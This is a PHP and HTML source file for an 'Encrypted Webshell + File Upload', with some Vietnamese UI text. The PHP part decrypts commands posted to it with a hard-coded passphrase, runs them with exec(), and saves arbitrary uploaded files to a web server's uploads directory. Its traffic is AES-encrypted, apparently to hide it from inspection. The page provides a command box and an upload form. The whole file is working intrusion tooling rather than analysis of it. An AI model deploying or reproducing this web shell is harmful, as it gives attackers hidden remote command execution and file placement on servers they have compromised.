<?php
$secretkey = "hoangvanthai2003";

function encryptData($plain_text) {
    $passphrase = $GLOBALS['secretkey'];
    $salt = openssl_random_pseudo_bytes(256);
    $iv = openssl_random_pseudo_bytes(16);
    $iterations = 999;
    $key = hash_pbkdf2("sha512", $passphrase, $salt, $iterations, 64);
    $encrypted_data = openssl_encrypt($plain_text, 'aes-256-cbc', hex2bin($key), OPENSSL_RAW_DATA, $iv);
    $data = array(
        "ciphertext" => base64_encode($encrypted_data),
        "iv" => bin2hex($iv),
        "salt" => bin2hex($salt)
    );
    return json_encode($data);
}

function decryptData($jsonString) {
    $passphrase = $GLOBALS['secretkey'];
    $jsondata = json_decode($jsonString, true);
    try {
        $salt = hex2bin($jsondata["salt"]);
        $iv  = hex2bin($jsondata["iv"]);
    } catch (Exception $e) {
        return null;
    }
    $ciphertext = base64_decode($jsondata["ciphertext"]);
    $iterations = 999;
    $key = hash_pbkdf2("sha512", $passphrase, $salt, $iterations, 64);
    $decrypted = openssl_decrypt($ciphertext, 'aes-256-cbc', hex2bin($key), OPENSSL_RAW_DATA, $iv);
    return $decrypted;
}

if (isset($_FILES['uploaded_file'])) {
    $target_directory = "/var/www/hvt1.com/public_html/uploads/"; 
    $target_file = $target_directory . basename($_FILES['uploaded_file']['name']);
    if (move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $target_file)) {
        echo encryptData("Upload file thành công: " . $target_file);
    } else {
        echo encryptData("Upload failed");
    }
    exit;
}

if (isset($_POST['command'])) {
    $encryptedCommand = $_POST['command'];
    $command = decryptData($encryptedCommand);

    $output = exec($command);
    $encryptedOutput = encryptData($output);
    echo $encryptedOutput;
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Encrypted Webshell + File Upload</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.0.0/crypto-js.min.js"></script>
    <script>
        const secretkey = "hoangvanthai2003";

        function encryptData(plain_text) {
            var passphrase = secretkey;
            var salt = CryptoJS.lib.WordArray.random(256);
            var iv = CryptoJS.lib.WordArray.random(16);
            var key = CryptoJS.PBKDF2(passphrase, salt, {
                hasher: CryptoJS.algo.SHA512,
                keySize: 64 / 8,
                iterations: 999
            });
            var encrypted = CryptoJS.AES.encrypt(plain_text, key, {
                iv: iv
            });
            var data = {
                ciphertext: CryptoJS.enc.Base64.stringify(encrypted.ciphertext),
                salt: CryptoJS.enc.Hex.stringify(salt),
                iv: CryptoJS.enc.Hex.stringify(iv)
            }
            return JSON.stringify(data);
        }

        function decryptData(encrypted_json_string) {
            var passphrase = secretkey;
            var obj_json = JSON.parse(encrypted_json_string);
            var encrypted = obj_json.ciphertext;
            var salt = CryptoJS.enc.Hex.parse(obj_json.salt);
            var iv = CryptoJS.enc.Hex.parse(obj_json.iv);
            var key = CryptoJS.PBKDF2(passphrase, salt, {
                hasher: CryptoJS.algo.SHA512,
                keySize: 64 / 8,
                iterations: 999
            });
            var decrypted = CryptoJS.AES.decrypt(encrypted, key, {
                iv: iv
            });
            return decrypted.toString(CryptoJS.enc.Utf8);
        }

        function sendCommand() {
            var command = document.getElementById('command').value;
            var encryptedCommand = encryptData(command);

            fetch('webshell.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: 'command=' + encodeURIComponent(encryptedCommand)
            })
            .then(response => response.text())
            .then(data => {
                var decryptedOutput = decryptData(data);
                document.getElementById('output').innerText = decryptedOutput;
            })
            .catch(error => console.error('Error:', error));
        }

        function uploadFile() {
            var fileInput = document.getElementById('fileInput').files[0];
            var formData = new FormData();
            formData.append("uploaded_file", fileInput);

            fetch('webshell.php', {
                method: 'POST',
                body: formData
            })
            .then(response => response.text())
            .then(data => {
                var decryptedOutput = decryptData(data);
                document.getElementById('output').innerText = decryptedOutput;
            })
            .catch(error => console.error('Error:', error));
        }
    </script>
</head>
<body>
    <h1>Encrypted Webshell + File Upload</h1>
    <input type="text" id="command" placeholder="Nhập lệnh" style="width: 800px; height: 40px; font-size: 16px;"/>
    <button onclick="sendCommand()" >Submit</button>
    <pre id="output"></pre>
    
    <!-- upload file -->
    <h2>Upload File</h2>
    <input type="file" id="fileInput" />
    <button onclick="uploadFile()">Upload File</button>
    
    
</body>
</html>
